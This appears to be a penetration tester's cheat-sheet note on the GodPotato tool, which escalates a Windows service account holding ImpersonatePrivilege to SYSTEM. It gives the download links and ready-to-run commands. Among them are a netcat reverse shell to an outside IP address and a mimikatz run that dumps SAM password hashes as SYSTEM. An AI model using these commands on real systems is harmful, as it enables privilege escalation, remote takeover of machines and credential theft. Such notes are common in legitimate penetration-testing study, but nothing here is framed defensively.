> The historical Potato has no way to run on the latest Windows system.
> 
> Elevates a service user with low privileges to "NT AUTHORITY\SYSTEM" privileges.
> As long as you have `ImpersonatePrivilege` permission. Then you are `NT AUTHORITY\SYSTEM`, usually WEB services and database services have `ImpersonatePrivilege` permissions.


#Windows_Privilege_Escalation 

# Download

Download binary
```
https://github.com/BeichenDream/GodPotato
```
```
https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe
https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

# Usage

Using `GodPotato`'s built-in Clsid for privilege escalation and execute a simple command
```bash
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

Use `GodPotato` to execute reverse shell commands
```bash
.\GodPotato-NET4.exe -cmd "nc.exe -e C:\Windows\System32\cmd.exe 192.168.169.123 5555"
```

Use `GodPotato` to run `mimikatz.exe` as `SYSTEM`
```powershell
.\GodPotato-NET4.exe -cmd './mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"'
```